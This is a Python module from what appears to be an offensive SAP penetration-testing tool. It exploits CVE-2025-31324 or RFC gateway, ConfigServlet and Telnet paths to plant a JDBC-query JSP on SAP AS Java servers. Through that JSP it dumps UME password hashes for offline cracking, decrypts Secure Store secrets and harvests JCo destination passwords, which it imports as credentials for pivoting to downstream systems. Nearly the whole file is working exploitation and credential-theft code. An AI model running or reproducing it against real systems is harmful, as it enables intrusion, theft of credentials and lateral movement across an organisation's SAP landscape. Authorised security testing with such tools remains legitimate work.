#!/usr/bin/env python3
"""Java DB / data extraction — JSP-based primitives for AS Java targets.

Extracted from modules/exploitation/sapmap_exploit.py.  All public
names are re-exported from sapmap_exploit so existing callers continue
to work unchanged.

Module-level imports of `_deploy_jsp_via_ctc`, `_deploy_jsp_via_telnet`,
and `execute_cve_2025_31324_via_shell` work because each is defined in
sapmap_exploit BEFORE the re-export point of this module (line ~1319).

Three forward-referenced helpers are lazy-imported inside the
functions that need them — Python resolves them on first call, by
which time sapmap_exploit is fully loaded:

  * `_deploy_jsp_via_gw`        (defined at line ~3971)
  * `_java_jsp_target_path`     (defined at line ~3959)
  * `extract_java_secstore`     (defined at line ~2480)
"""
from __future__ import annotations

import logging
import os
import re

from sapmap_models import (
    SAPNode, SAPMAPState, Credentials, Finding, Severity, RFCConnection,
    InstanceInfo,
)
from sapmap_errors import format_rfc_exception
from sapmap_exploit import (
    _deploy_jsp_via_ctc,
    _deploy_jsp_via_telnet,
    _ctc_deploy_available,
    _telnet_deploy_available,
    execute_cve_2025_31324_via_shell,
)

logger = logging.getLogger(__name__)


def _ensure_java_db_jsp(node: SAPNode) -> str:
    """Return the URL of a deployed JDBC-query JSP on `node`, deploying one
    via CVE-2025-31324 or GW SAPXPG if not already present.

    The JSP runs SELECTs through the SecStoreFS-decrypted jdbc/pool/<SID>
    credentials.  Returns "" on failure.
    """
    # Lazy-imported (defined later in sapmap_exploit than this module's
    # re-export point).  Resolved on first call.
    from sapmap_exploit import _deploy_jsp_via_gw, _java_jsp_target_path

    import sap_java_db as _jdb
    from sap_cve_2025_31324 import write_file_via_shell
    import random as _r, string as _s
    from datetime import datetime as _dt

    # Re-use any cached java DB JSP if it still answers.
    if not hasattr(node, "java_db_jsps") or node.java_db_jsps is None:
        node.java_db_jsps = []
    for cached in list(node.java_db_jsps):
        url = cached.get("url") if isinstance(cached, dict) else None
        if not url:
            continue
        # Quick aliveness check via a trivial SELECT.
        print(f"[*] {node.sid}: probing cached JDBC JSP {url}")
        try:
            r = _jdb.invoke_jdbc_query(url, node.sid,
                                        "SELECT 1 FROM DUAL",
                                        max_rows=1, timeout=8)
        except Exception:
            r = {"success": False}
        if r.get("success") or r.get("error", "").startswith("HTTP"):
            print(f"[+] {node.sid}: reusing cached JDBC JSP — no redeploy needed")
            return url
        # Stale — drop from cache.
        print(f"[!] {node.sid}: cached JDBC JSP no longer responds — discarding")
        node.java_db_jsps.remove(cached)

    # Resolve Java HTTP port.
    http_port = getattr(node, "cve_2025_31324_port", 0) or 0
    if not http_port:
        for inst in node.instances:
            for p, svc in inst.ports.items():
                if svc == "java_http":
                    http_port = p; break
            if http_port: break
    if not http_port:
        print(f"[-] {node.sid}: no Java HTTP port known — cannot deploy JDBC JSP")
        return ""
    java_inst = (http_port - 50000) // 100

    jsp_name = "jdb" + "".join(_r.choice(_s.ascii_lowercase) for _ in range(6)) + ".jsp"
    target_path = _java_jsp_target_path(node, java_inst, jsp_name)
    jsp_url = f"http://{node.ip or node.hostname}:{http_port}/irj/{jsp_name}"
    _ctc_ok    = _ctc_deploy_available(node)
    _telnet_ok = (not _ctc_ok) and _telnet_deploy_available(node)
    delivery = ("CVE-2025-31324" if node.cve_2025_31324_vulnerable
                else "GW SAPXPG"  if node.gw_vulnerable
                else "CTC ConfigServlet (UME admin)" if _ctc_ok
                else "Telnet (UME admin)" if _telnet_ok
                else "NONE")
    print(f"[*] {node.sid}: Deploying JDBC-query JSP via {delivery}")
    print(f"[*] {node.sid}:   JSP name      : {jsp_name}")
    print(f"[*] {node.sid}:   JSP source    : {len(_jdb.JDBC_QUERY_JSP)} bytes")
    print(f"[*] {node.sid}:   target path   : {target_path}")
    print(f"[*] {node.sid}:   reachable URL : {jsp_url}")

    # Deploy via CVE-31324 if available (preferred), else GW.
    if node.cve_2025_31324_vulnerable:
        execute_cve_2025_31324_via_shell(node, "cmd.exe /C echo sapmap_prime")
        if not node.cve_2025_31324_shells:
            print(f"[-] {node.sid}: no JSP webshell available")
            return ""
        shell_url = node.cve_2025_31324_shells[-1]["url"]
        print(f"[*] {node.sid}:   write via     : CVE-31324 webshell @ "
              f"{shell_url}")
        w = write_file_via_shell(shell_url, target_path,
                                   _jdb.JDBC_QUERY_JSP.encode("utf-8"))
        if not w.get("success"):
            print(f"[-] {node.sid}: JDBC JSP write failed: {w.get('error')}")
            return ""
        print(f"[+] {node.sid}:   wrote {w['chunks_written']} chunk(s) of "
              f"base64 + certutil-decoded into {target_path}")
    elif node.gw_vulnerable:
        w = _deploy_jsp_via_gw(node, _jdb.JDBC_QUERY_JSP.encode("utf-8"),
                                 target_path, label="JDBC-query JSP")
        if not w.get("success"):
            print(f"[-] {node.sid}: JDBC JSP GW write failed: "
                  f"{w.get('error', '?')}")
            return ""
        print(f"[+] {node.sid}:   wrote {w.get('bytes_written', 0)} bytes "
              f"via {w.get('method', 'gw')}")
    elif _ctc_ok or _telnet_ok:
        # Post-RECON paths: try CTC first (HTTP, same port as RECON),
        # fall through to Telnet for hardened targets that removed
        # /ctc/ConfigServlet.
        r = None
        attempted = []
        if _ctc_ok:
            attempted.append("CTC")
            r = _deploy_jsp_via_ctc(node,
                                     _jdb.JDBC_QUERY_JSP.encode("utf-8"),
                                     target_path, label="JDBC-query JSP")
            if r.get("success"):
                print(f"[+] {node.sid}:   wrote {r.get('bytes_written', 0)} "
                      f"bytes via {r.get('method', '?')}")
            else:
                print(f"[!] {node.sid}: CTC deploy failed: "
                      f"{r.get('error', '?')}")
                r = None
        if (not r or not r.get("success")) and _telnet_deploy_available(node):
            attempted.append("Telnet")
            print(f"[*] {node.sid}: falling back to Telnet (UME admin) …")
            r = _deploy_jsp_via_telnet(node,
                                         _jdb.JDBC_QUERY_JSP.encode("utf-8"),
                                         target_path, label="JDBC-query JSP")
            if r.get("success"):
                print(f"[+] {node.sid}:   wrote {r.get('bytes_written', 0)} "
                      f"bytes via telnet method={r.get('method', '?')}")
        if not r or not r.get("success"):
            err = (r or {}).get("error", "deploy failed")
            print(f"[-] {node.sid}: all post-RECON deploy paths failed "
                  f"({'/'.join(attempted) or 'none'}): {err}")
            node.java_deploy_blocked = True
            return ""
        node.java_deploy_blocked = False
    else:
        print(f"[-] {node.sid}: no deployment path "
              f"(CVE-31324 vuln={node.cve_2025_31324_vulnerable}, "
              f"GW vuln={node.gw_vulnerable}, Java-admin-user=no)")
        return ""

    print(f"[+] {node.sid}: JDBC-query JSP at {jsp_url}")
    node.java_db_jsps.append({
        "url": jsp_url,
        "deployed_at": _dt.now().isoformat(),
    })
    return jsp_url


def download_java_table(node: SAPNode, table: str, fields: str = "",
                          where: str = "", max_rows: int = 500) -> dict:
    """Run a SELECT against the Java stack's DB and return rows.

    Returns dict {success, columns, rows, row_count, jsp_url, error}.
    """
    import sap_java_db as _jdb
    if "JAVA" not in (node.system_type or "").upper():
        return {"success": False, "error": "Not a Java/dual-stack system"}
    jsp_url = _ensure_java_db_jsp(node)
    if not jsp_url:
        return {"success": False,
                "error": "Could not deploy JDBC JSP (need CVE-2025-31324 "
                         "or GW SAPXPG vuln)"}
    cols = fields.strip() if fields else "*"
    sql = f"SELECT {cols} FROM {table}"
    if where.strip():
        sql += f" WHERE {where}"
    print(f"[*] {node.sid}: SQL → {sql}  (max {max_rows} rows)")
    r = _jdb.invoke_jdbc_query(jsp_url, node.sid, sql, max_rows=max_rows)
    r["jsp_url"] = jsp_url
    if r.get("success"):
        print(f"[+] {node.sid}: returned {r['row_count']} row(s), "
              f"{len(r.get('columns', []))} column(s)")
    else:
        print(f"[-] {node.sid}: query failed: {r.get('error', '?')}")
    return r


def extract_java_password_hashes(node: SAPNode) -> dict:
    """Dump UME_STRINGS j_user/j_password pairs for offline cracking.

    Saves a `hashes_<SID>_<timestamp>.txt` to loot/ in the standard
    `username:{ALG, ITER, SLEN}base64(hash||salt)` format with a header
    documenting the algorithm.

    Returns dict {success, count, hashes, file_path, error}.
    """
    # Lazy: extract_java_secstore is defined later in sapmap_exploit.
    from sapmap_exploit import extract_java_secstore

    import sap_java_db as _jdb
    import os as _os
    from datetime import datetime as _dt
    if "JAVA" not in (node.system_type or "").upper():
        return {"success": False, "error": "Not a Java/dual-stack system"}
    print(f"[*] {node.sid}: ===== Java password material extraction =====")
    print(f"[*] {node.sid}: Step 1/3 — ensure JDBC-query JSP is deployed")
    jsp_url = _ensure_java_db_jsp(node)
    if not jsp_url:
        return {"success": False,
                "error": "Could not deploy JDBC JSP "
                         "(need CVE-2025-31324 or GW SAPXPG vuln)"}

    print(f"[*] {node.sid}: Step 2/3 — query UME_STRINGS for j_password rows")
    print(f"[*] {node.sid}:   SQL: {_jdb.UME_HASH_QUERY}")
    print(f"[*] {node.sid}:   POST → {jsp_url}")
    qr = _jdb.invoke_jdbc_query(jsp_url, node.sid,
                                  _jdb.UME_HASH_QUERY, max_rows=10000)
    hashes = []
    ume_err = ""
    if qr.get("success"):
        print(f"[+] {node.sid}:   raw rows returned: {qr.get('row_count', 0)} "
              f"(columns: {qr.get('columns', [])})")
        hashes = _jdb.parse_password_hashes(qr)
        print(f"[+] {node.sid}:   parsed into {len(hashes)} UME hash(es)")
        for h in hashes:
            algo = h.get("algorithm", "?")
            iters = h.get("iterations", 0)
            print(f"[+] {node.sid}:     {h['username']:30s} "
                  f"[{algo}, {iters} iterations]")
    else:
        ume_err = qr.get("error", "query failed")
        print(f"[-] {node.sid}:   UME hash query failed: {ume_err}")

    # Diagnostic — if the primary j_password query came back empty, list
    # every ATTR that looks password-related so the operator can see
    # what this kernel actually stores.  NW 7.0 SolMan, older UME
    # builds, and custom datasources sometimes key passwords under
    # different names (e.g. jSaltedHashedPassword, Password, HASHED_PWD,
    # PWDSALTEDHASH).
    if qr.get("success") and not hashes:
        diag_sql = (
            "SELECT ATTR, COUNT(*) AS C FROM UME_STRINGS "
            "WHERE LOWER(ATTR) LIKE '%pass%' "
            "   OR LOWER(ATTR) LIKE '%pwd%' "
            "   OR LOWER(ATTR) LIKE '%hash%' "
            "   OR LOWER(ATTR) LIKE '%secret%' "
            "   OR LOWER(ATTR) LIKE '%credential%' "
            "GROUP BY ATTR ORDER BY ATTR"
        )
        print(f"[*] {node.sid}:   0 hashes parsed — running ATTR diagnostic")
        print(f"[*] {node.sid}:   SQL: {diag_sql}")
        dq = _jdb.invoke_jdbc_query(jsp_url, node.sid, diag_sql, max_rows=200)
        if dq.get("success") and dq.get("rows"):
            print(f"[+] {node.sid}:   UME_STRINGS password-related ATTR values:")
            for r in dq["rows"]:
                attr = (r[0] if len(r) > 0 else "").strip()
                cnt  = (r[1] if len(r) > 1 else "").strip()
                print(f"[+] {node.sid}:     {attr:50s} × {cnt}")
            print(f"[*] {node.sid}:   If 'j_password' is absent, the kernel "
                  f"stores hashes under a different attribute — raise an "
                  f"issue with the ATTR list above.")
        elif dq.get("success"):
            print(f"[!] {node.sid}:   no password-related ATTR names at all "
                  f"in UME_STRINGS — hashes may live in UME_BLOBS (BLOB "
                  f"column) or in the ABAP backend (PWDSALTEDHASH/USR02)")
        else:
            print(f"[-] {node.sid}:   ATTR diagnostic query failed: "
                  f"{dq.get('error', '?')}")

        # UME-federation hint: if ume.r3.connection.* keys are in SecStore,
        # the UME is backed by an ABAP system's USR02 — only users marked
        # "UME Database" in NWA land in UME_STRINGS, while ABAP users
        # authenticate against the backend and have their hashes there.
        try:
            ume_r3_keys = [r for r in (node.java_secstore_entries or [])
                             if (r.get("name") or "").startswith("#~ume.r3.")]
        except Exception:
            ume_r3_keys = []
        if ume_r3_keys:
            backend_sid = ""
            for r in ume_r3_keys:
                nm = (r.get("name") or "")
                m = re.search(r"#~ume\.r3\.connection\.([A-Za-z0-9]+)\.",
                               nm)
                if m and m.group(1).lower() != "master":
                    backend_sid = m.group(1).upper()
                    break
            print(f"[*] {node.sid}:   federation note — SecStore has "
                  f"{len(ume_r3_keys)} ume.r3.connection.* key(s); UME is "
                  f"backed by an ABAP system"
                  + (f" (likely {backend_sid})" if backend_sid else "")
                  + ".  Only 'UME Database' users (the 16 service "
                  f"accounts in NWA: anonymous, cup_app, deploy_service, "
                  f"etc.) live in UME_STRINGS.  ABAP users' hashes are "
                  f"in the backend's USR02 — download them via the "
                  f"backend node's 'ABAP password hashes' action.")

    # Pull cleartext credential entries from J2EE_CONFIGENTRY (per user
    # request).  These are already SecStoreFS-decrypted by the
    # "Download Java Secure Store" action which caches them on the node.
    # If that hasn't been run, trigger it now so the rows are available.
    print(f"[*] {node.sid}: Step 3/3 — surface J2EE_CONFIGENTRY "
          f"password-like entries")
    if not (node.java_secstore_entries or []):
        print(f"[*] {node.sid}:   SecStore not yet decrypted — running "
              f"extract_java_secstore() now to populate the cache")
        from sapmap_state import SAPMAPState as _MS
        extract_java_secstore(node, _MS())   # transient state; just want the
                                              # node-level cache populated
    else:
        print(f"[*] {node.sid}:   SecStore already decrypted — using cached "
              f"{len(node.java_secstore_entries)} entries")
    configentry_secrets = []
    for row in node.java_secstore_entries or []:
        if row.get("source") != "J2EE_CONFIGENTRY":
            continue
        name_l = (row.get("name") or "").lower()
        if any(k in name_l for k in ("pass", "pwd", "secret",
                                       "credential", "key")):
            configentry_secrets.append({
                "cid":       row.get("cid", ""),
                "name":      row.get("name", ""),
                "value":     row.get("value", ""),
                # Carry through any destination context that was
                # resolved when the SecStore was decrypted — lets us
                # label anonymous #~logon.password / #~jco.client.passwd
                # entries with their destination name, user, and host.
                "dest_name": row.get("dest_name", ""),
                "dest_user": row.get("dest_user", ""),
                "dest_host": row.get("dest_host", ""),
            })
    print(f"[+] {node.sid}:   surfaced {len(configentry_secrets)} "
          f"password-like configentry rows")
    for s in configentry_secrets:
        # Mask values longer than a few chars
        v = s.get("value", "")
        if v and len(v) > 4:
            preview = "•" * min(len(v), 8) + f" ({len(v)}B)"
        elif v:
            preview = repr(v)
        else:
            preview = "(empty)"
        # Build context suffix: "  [dest=X user=Y host=Z]"
        ctx_parts = []
        if s.get("dest_name"):
            ctx_parts.append(f"dest={s['dest_name']}")
        if s.get("dest_user"):
            ctx_parts.append(f"user={s['dest_user']}")
        if s.get("dest_host"):
            ctx_parts.append(f"host={s['dest_host']}")
        ctx_suffix = f"  [{' '.join(ctx_parts)}]" if ctx_parts else ""
        print(f"[+] {node.sid}:     {s['name']:45s} = {preview}{ctx_suffix}")

    if not hashes and not configentry_secrets:
        return {"success": False, "error": ume_err or "no hashes or secrets found"}

    # Persist to disk.
    import sapmap_state as _ss
    loot_dir = _ss.ensure_loot_dir("hashes")
    ts = _dt.now().strftime("%Y%m%d_%H%M%S")
    fname = f"hashes_java_{node.sid}_{ts}.txt"
    fpath = _os.path.join(loot_dir, fname)
    text = _jdb.hashes_to_text(hashes, configentry_secrets)
    with open(fpath, "w", encoding="utf-8") as f:
        f.write(text)
    print(f"[+] {node.sid}: ===== summary =====")
    print(f"[+] {node.sid}:   {len(hashes)} UME hash(es) (Section 1 of file)")
    print(f"[+] {node.sid}:   {len(configentry_secrets)} configentry "
          f"secret(s) (Section 2 of file)")
    print(f"[+] {node.sid}:   file: {fpath} ({len(text)} bytes)")
    return {"success": True,
            "count": len(hashes),
            "configentry_secret_count": len(configentry_secrets),
            "hashes": hashes,
            "configentry_secrets": configentry_secrets,
            "file_path": fpath}


def assess_java_impact(node: SAPNode, state: SAPMAPState) -> dict:
    """Run business-impact scenarios against an AS Java target.

    Inventories the deployed components by querying every distinct
    deployment-name token from J2EE_CONFIGENTRY (rows whose NAME looks
    like `sap.com/<package>*<timestamp>*<revision>`), grabs any
    audit-related ConfigTool property names, and feeds both into
    sap_java_impact.assess() which runs PI/PO, NWDI/CTS+, HR/ESS,
    KMC/Search, and audit-tamper scenarios.

    Results land on node.impact_results (same field the ABAP impact
    module already uses).
    """
    import sap_java_db as _jdb
    import sap_java_impact as _imp

    result = {"success": False, "results": [], "components": 0,
              "error": ""}
    if "JAVA" not in (node.system_type or "").upper():
        result["error"] = "Not a Java/dual-stack system"
        return result

    print(f"[*] {node.sid}: ===== Java business-impact assessment =====")
    print(f"[*] {node.sid}: Step 1/3 — ensure JDBC-query JSP is deployed")
    jsp_url = _ensure_java_db_jsp(node)
    if not jsp_url:
        result["error"] = "Could not deploy JDBC JSP (need CVE-2025-31324 or GW vuln)"
        return result

    print(f"[*] {node.sid}: Step 2/3 — inventory deployed components from "
          f"J2EE_CONFIGENTRY")
    qr = _jdb.invoke_jdbc_query(
        jsp_url, node.sid,
        # Distinct deployment-name tokens.  These are the `sap.com/<pkg>`
        # NAME entries scattered across many CIDs (see e.g. the "JDBC dump"
        # we already saw — every webapp shows up here).  Strip the
        # *<timestamp>*<rev> suffix client-side for cleaner pattern matching.
        "SELECT DISTINCT NAME FROM J2EE_CONFIGENTRY "
        "WHERE NAME LIKE 'sap.com/%' OR NAME LIKE 'caf~%' "
        "OR NAME LIKE 'tc~%'",
        max_rows=5000)
    if not qr.get("success"):
        result["error"] = qr.get("error", "component query failed")
        print(f"[-] {node.sid}: component query failed: {result['error']}")
        return result

    components = []
    for row in qr.get("rows", []):
        if not row:
            continue
        name = row[0] or ""
        # Strip "*<timestamp>*<revision>" trailers SAP appends to deployments
        norm = re.sub(r"\*\d+\*\d+$", "", name)
        components.append(norm)
    components = sorted(set(components))
    result["components"] = len(components)
    print(f"[+] {node.sid}:   {len(components)} distinct deployment(s) "
          f"inventoried")

    # Audit-related property names — used by the audit-tamper scenario.
    qr2 = _jdb.invoke_jdbc_query(
        jsp_url, node.sid,
        "SELECT DISTINCT NAME FROM J2EE_CONFIGENTRY "
        "WHERE LOWER(NAME) LIKE '%audit%'",
        max_rows=500)
    audit_props = []
    if qr2.get("success"):
        for row in qr2.get("rows", []):
            if row and row[0]:
                audit_props.append(row[0])
    print(f"[+] {node.sid}:   {len(audit_props)} audit-related "
          f"property name(s) found")

    # UME user count — used by the SSO/availability scenario to quantify
    # blast radius (number of accounts that would be locked out by a
    # destructive UPDATE on UME_STRINGS).
    qr3 = _jdb.invoke_jdbc_query(
        jsp_url, node.sid,
        "SELECT COUNT(*) FROM UME_STRINGS WHERE ATTR = 'uniquename'",
        max_rows=1)
    ume_user_count = 0
    if qr3.get("success") and qr3.get("rows"):
        try:
            ume_user_count = int(qr3["rows"][0][0])
        except (ValueError, TypeError, IndexError):
            ume_user_count = 0
    print(f"[+] {node.sid}:   {ume_user_count} UME user account(s)")

    print(f"[*] {node.sid}: Step 3/3 — running impact scenarios")
    impact_results = _imp.assess(components, audit_properties=audit_props,
                                   ume_user_count=ume_user_count)
    print(f"[+] {node.sid}: ===== {len(impact_results)} scenario(s) "
          f"matched this stack =====")
    for r in impact_results:
        print(f"[+] {node.sid}:   [{r.severity_label}] {r.scenario}")
        print(f"[+] {node.sid}:     headline: {r.headline}")
        if r.sample_records:
            sample = r.sample_records[:3]
            print(f"[+] {node.sid}:     evidence (first {len(sample)}): "
                  f"{', '.join(sample)}")

    # Persist on the node — same field the ABAP impact module writes to,
    # rendered by the existing impact_view modal.
    node.impact_results = [r.to_dict() for r in impact_results]
    result["results"] = node.impact_results
    result["success"] = True
    return result


def read_java_destinations(node: SAPNode, state: SAPMAPState) -> dict:
    """Enumerate JCo destinations in J2EE_CONFIGENTRY, decrypt their
    passwords, and plot each one onto the SAPMAP:

      - Existing target node (matched by SID)         -> add credentials
                                                          + draw an RFC edge
      - No target on the map yet                      -> silent-add an
                                                          ABAP node with
                                                          the destination
                                                          host info, then
                                                          credentials + edge

    Returns dict {success, destinations: [...], added_nodes, added_edges,
                   credentials_added, error}.
    """
    # Lazy: extract_java_secstore is defined later in sapmap_exploit.
    from sapmap_exploit import extract_java_secstore

    import sap_java_db as _jdb
    from datetime import datetime as _dt

    result = {"success": False, "destinations": [], "added_nodes": 0,
              "added_edges": 0, "credentials_added": 0, "error": ""}

    if "JAVA" not in (node.system_type or "").upper():
        result["error"] = "Not a Java/dual-stack system"
        return result

    print(f"[*] {node.sid}: ===== Read JCo destinations =====")
    print(f"[*] {node.sid}: Step 1/3 — ensure JDBC-query JSP is deployed")
    jsp_url = _ensure_java_db_jsp(node)
    if not jsp_url:
        result["error"] = "Could not deploy JDBC JSP (need CVE-2025-31324 or GW vuln)"
        return result

    print(f"[*] {node.sid}: Step 2/3 — query J2EE_CONFIGENTRY for "
          f"`#~%` rows under any CID with #~destination.name")
    print(f"[*] {node.sid}:   SQL: {_jdb.JCO_DESTINATIONS_QUERY[:80]}...")
    qr = _jdb.invoke_jdbc_query(jsp_url, node.sid,
                                  _jdb.JCO_DESTINATIONS_QUERY,
                                  max_rows=10000)
    if not qr.get("success"):
        result["error"] = qr.get("error", "query failed")
        print(f"[-] {node.sid}: query failed: {result['error']}")
        return result
    dests = _jdb.group_destinations(qr)
    print(f"[+] {node.sid}:   parsed {len(dests)} JCo destination(s) from "
          f"{qr.get('row_count', 0)} property rows")
    for d in dests:
        print(f"[+] {node.sid}:     {d['name']:30s} -> "
              f"{d.get('target_sid','?'):4s}@{d.get('ashost','?')}:"
              f"{d.get('sysnr','?')} client={d.get('client','?')} "
              f"user={d.get('user','?') or '<empty>'}")

    if not dests:
        result["success"] = True
        return result

    # Step 3 — passwords are in VBYTES; trigger SecStore decrypt to populate
    # node.java_secstore_entries cache, then index it by (cid, name).
    print(f"[*] {node.sid}: Step 3/3 — decrypt destination passwords via "
          f"SecStore extraction (also caches all 1700+ J2EE_CONFIGENTRY rows)")
    if not (node.java_secstore_entries or []):
        extract_java_secstore(node, state)
    pwd_index = {}
    for row in node.java_secstore_entries or []:
        if row.get("source") != "J2EE_CONFIGENTRY":
            continue
        if row.get("name") == "#~jco.client.passwd":
            pwd_index[row.get("cid")] = row.get("value", "")

    # Apply passwords + plot.
    for d in dests:
        d["password"] = pwd_index.get(d["cid"], "")

    # Persist on the node + plot.
    node.java_destinations = dests
    print(f"[*] {node.sid}: ===== plotting onto map =====")
    for d in dests:
        target_sid = d.get("target_sid", "")
        host       = d.get("ashost", "")
        client     = d.get("client", "") or ""
        user       = d.get("user", "")
        pwd        = d.get("password", "")
        sysnr      = d.get("sysnr", "")

        if not target_sid:
            # Some destinations don't fill r3name — try to derive from
            # destination.name (e.g. "to_S4H" → "S4H") as a hint only.
            m = re.match(r"^to[_-](?P<sid>[A-Z0-9]{3})$", d.get("name", ""),
                          flags=re.IGNORECASE) if d.get("name") else None
            if m:
                target_sid = m.group("sid").upper()
                print(f"[*] {node.sid}:   {d['name']}: SID derived from "
                      f"destination name → {target_sid}")

        # Find or create the target node.
        if target_sid:
            target_node = state.get_node(target_sid)
        else:
            target_node = None
        if target_node is None and target_sid:
            instances = []
            if sysnr:
                instances.append(InstanceInfo(
                    instance_nr=sysnr.zfill(2), ip=host or "",
                    ports={int("33" + sysnr.zfill(2)): "gateway"}))
            target_node = SAPNode(
                sid=target_sid, system_type="ABAP",
                hostname=host, ip=host or "",
                instances=instances,
                saprouter=node.saprouter)
            state.add_node(target_node)
            result["added_nodes"] += 1
            print(f"[+] {node.sid}:   plotted new ABAP node {target_sid} "
                  f"@ {host}:{sysnr}")

        # Credentials on the target.
        if target_node and user and pwd:
            already = any(c.username == user and c.password == pwd
                            and c.client == (client or "")
                            for c in target_node.credentials)
            if not already:
                target_node.credentials.append(Credentials(
                    username=user, password=pwd,
                    client=client or "000",
                    instance_nr=sysnr.zfill(2) if sysnr else "00",
                    verified=False,
                ))
                result["credentials_added"] += 1
                print(f"[+] {node.sid}:   imported {user}@{target_sid} "
                      f"client {client} credential")

        # RFC edge from this Java node → target.
        if target_node:
            edge_dest = d.get("name") or f"jco_{d.get('cid','?')}"
            existing = [c for c in state.connections
                         if c.source_sid == node.sid
                            and c.target_sid == target_sid
                            and c.destination_name == edge_dest]
            if not existing:
                state.add_connection(RFCConnection(
                    source_sid=node.sid,
                    source_host=node.hostname or node.ip,
                    target_sid=target_sid,
                    target_host=host,
                    target_ip=host if host.count(".") == 3 else "",
                    target_instance_nr=sysnr.zfill(2) if sysnr else "",
                    destination_name=edge_dest,
                    rfc_user=user or "",
                    client=client or "",
                    secstore_password=pwd or "",
                    tested=False, logon_tested=False,
                ))
                result["added_edges"] += 1
                print(f"[+] {node.sid}:   added RFC edge "
                      f"{node.sid} → {target_sid} (dest={edge_dest}, "
                      f"user={user or '<empty>'})")

    # Finding on the source node summarizing the dump.
    if dests:
        targets_seen = sorted(set(d.get("target_sid", "")
                                    for d in dests if d.get("target_sid")))
        f = Finding(
            name="JCo destinations enumerated",
            severity=Severity.HIGH,
            description=(
                f"{len(dests)} JCo destination(s) read from "
                f"J2EE_CONFIGENTRY.  Downstream targets: "
                f"{', '.join(targets_seen) if targets_seen else '(none parsed)'}."
            ),
            remediation=(
                "Restrict OS-level access to /usr/sap/<SID>/SYS/global/"
                "security/data/SecStore.{properties,key}.  Patch the "
                "vulnerability used to deploy the JSP "
                "(CVE-2025-31324 or RFC Gateway exposure).  Audit the "
                "credentials in each destination and rotate any that are "
                "shared or over-privileged."
            ),
            detail=", ".join(d["name"] for d in dests[:30]) +
                    ("..." if len(dests) > 30 else ""),
        )
        if not any(x.name == f.name for x in node.findings):
            node.findings.append(f)

    print(f"[+] {node.sid}: ===== summary =====")
    print(f"[+] {node.sid}:   destinations parsed: {len(dests)}")
    print(f"[+] {node.sid}:   downstream nodes plotted: {result['added_nodes']}")
    print(f"[+] {node.sid}:   credentials imported: {result['credentials_added']}")
    print(f"[+] {node.sid}:   RFC edges drawn: {result['added_edges']}")
    result["success"] = True
    result["destinations"] = dests
    return result


# Module-level cache so multi-destination runs that all point at the
# same orphan host only probe it once per extraction.
_sid_probe_cache: dict = {}
